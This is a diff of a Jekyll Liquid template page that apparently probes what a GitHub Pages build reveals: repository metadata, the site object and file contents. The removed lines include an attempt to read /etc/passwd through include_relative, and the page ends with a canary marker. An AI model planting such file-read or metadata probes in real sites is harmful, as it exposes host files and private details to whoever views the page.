@@ -4,50 +4,26 @@ layout: null
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Liquid Template Probe</h1>
-
-<h2>site.github object (metadata exposure)</h2>
+<h1>Liquid Probe (fixed)</h1>
 <pre>
 owner: {{ site.github.owner_name }}
 repo: {{ site.github.repository_name }}
-repo_url: {{ site.github.repository_url }}
-api_url: {{ site.github.api_url }}
 environment: {{ site.github.environment }}
 build_revision: {{ site.github.build_revision }}
-project_title: {{ site.github.project_title }}
-project_tagline: {{ site.github.project_tagline }}
 hostname: {{ site.github.hostname }}
 pages_hostname: {{ site.github.pages_hostname }}
 pages_env: {{ site.github.pages_env }}
-url: {{ site.github.url }}
-baseurl: {{ site.github.baseurl }}
-contributors: {{ site.github.contributors | size }}
-releases: {{ site.github.releases | size }}
-public_repositories: {{ site.github.public_repositories | size }}
-organization_members: {{ site.github.organization_members | size }}
 private: {{ site.github.private }}
-is_project_page: {{ site.github.is_project_page }}
-is_user_page: {{ site.github.is_user_page }}
-show_downloads: {{ site.github.show_downloads }}
 versions: {{ site.github.versions }}
+api_url: {{ site.github.api_url }}
+contributors_count: {{ site.github.contributors | size }}
+releases_count: {{ site.github.releases | size }}
+public_repos_count: {{ site.github.public_repositories | size }}
+org_members_count: {{ site.github.organization_members | size }}
 </pre>
-
-<h2>Environment Variables (via site object)</h2>
-<pre>
-{% for key_value in site %}
-  {{ key_value[0] }}: {{ key_value[1] | truncate: 80 }}
-{% endfor %}
-</pre>
-
-<h2>File Read Attempts</h2>
-<pre>
-{% capture file_content %}{% include_relative README.md %}{% endcapture %}
-README.md length: {{ file_content | size }}
-
-{% capture passwd %}{% include_relative /etc/passwd %}{% endcapture %}
-/etc/passwd: {{ passwd | truncate: 50 }}
-</pre>
-
-<h2>CANARY_LIQUID_PROBE_COMPLETE</h2>
+<h2>README content via include_relative</h2>
+<pre>{% capture readme %}{% include_relative README.md %}{% endcapture %}
+README: {{ readme | truncate: 200 }}</pre>
+<h2>CANARY_LIQUID_PROBE_v2</h2>
 </body>
 </html>
